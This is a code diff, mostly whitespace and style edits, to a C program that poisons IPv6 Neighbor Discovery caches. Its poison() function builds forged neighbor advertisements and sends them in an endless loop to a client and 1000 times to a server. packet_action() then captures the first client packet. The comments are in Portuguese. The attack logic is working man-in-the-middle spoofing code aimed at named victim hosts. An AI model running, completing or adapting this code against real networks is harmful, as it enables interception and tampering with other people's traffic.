@@ -39,22 +39,25 @@ void poison(struct victim *dst) {
 
 	printf("Setting up Client poisoning\n");
 	pkt = alloc_ndadvert(&svictim, dst);
-	//for(i = 0; i < 1000; i++) {
-	for(;;) {
+
+	//for (i = 0; i < 1000; i++) {
+	for (;;) {
 		send_icmpv6(&(dst->ipv6), pkt);
 		sleep(1);
 	}
+
 	free(pkt);
 	printf("Client poisoned\n");
 
 	printf("Setting up Server poisoning\n");
 	pkt = alloc_ndadvert(dst, &svictim);
-	for(i = 0; i < 1000; i++) {
+
+	for (i = 0; i < 1000; i++) {
 		send_icmpv6(&svictim.ipv6, pkt);
 	}
+
 	free(pkt);
 	printf("Server poisoned\n");
-
 }
 
 void populate_cvictim(char *pkt) {
@@ -90,7 +93,7 @@ void packet_action(char *packet) {
 	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
 
 		/* Por enquanto é apenas suportado 1 cliente */
-		if(!cvictim)
+		if (!cvictim)
 			/* já faz o primeiro poison só prá deixar de ser otário */
 			populate_cvictim(packet);
 
